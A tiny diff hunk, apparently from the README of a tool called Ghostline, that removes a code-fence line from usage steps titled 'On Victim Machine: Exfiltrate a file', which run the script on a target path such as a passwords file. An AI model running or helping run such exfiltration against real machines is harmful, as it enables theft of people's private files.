@@ -34,7 +34,6 @@ pip install -r requirements.txt
 On Victim Machine:
 Exfiltrate a file:
 
-```bash
 python3 Ghostline.py
 Enter the path to the target file (e.g., /home/user/passwords.txt)
 
